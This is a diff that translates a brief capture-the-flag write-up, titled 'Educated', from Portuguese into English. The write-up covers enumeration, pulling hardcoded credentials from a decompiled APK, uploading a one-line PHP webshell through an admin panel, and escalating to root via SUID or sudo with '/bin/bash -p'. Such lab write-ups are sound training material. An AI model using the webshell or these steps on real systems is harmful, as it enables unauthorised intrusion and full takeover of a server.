@@ -1,7 +1,7 @@
 # Educated
 > Free School CMS + jadx APK reversing
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
@@ -11,39 +11,39 @@ nmap -sC -sV -oN nmap.txt <IP>
 gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html
 ```
 
-Aplicação "Free School" identificada. APK disponível para download.
+"Free School" application identified. APK available for download.
 
-## Exploração
+## Exploitation
 
-Análise do APK com `jadx` para extrair credenciais hardcoded:
+APK analysis with `jadx` to extract hardcoded credentials:
 
 ```
 jadx -d output/ app.apk
 grep -r "password\|secret\|api_key" output/
 ```
 
-Credenciais encontradas no código Java decompilado.
+Credentials found in decompiled Java code.
 
-Acesso ao painel admin → upload de webshell PHP.
+Admin panel access → PHP webshell upload.
 
 ```
 # webshell.php
 <?php system($_GET['cmd']); ?>
 ```
 
-Reverse shell obtido.
+Reverse shell obtained.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
 ```
 sudo -l
 find / -perm -4000 2>/dev/null
 ```
 
-Caminho de escalada via binário SUID ou configuração sudo.
+Escalation path via SUID binary or sudo configuration.
 
 ```
 /bin/bash -p
 ```
 
-Root obtido.
+Root obtained.
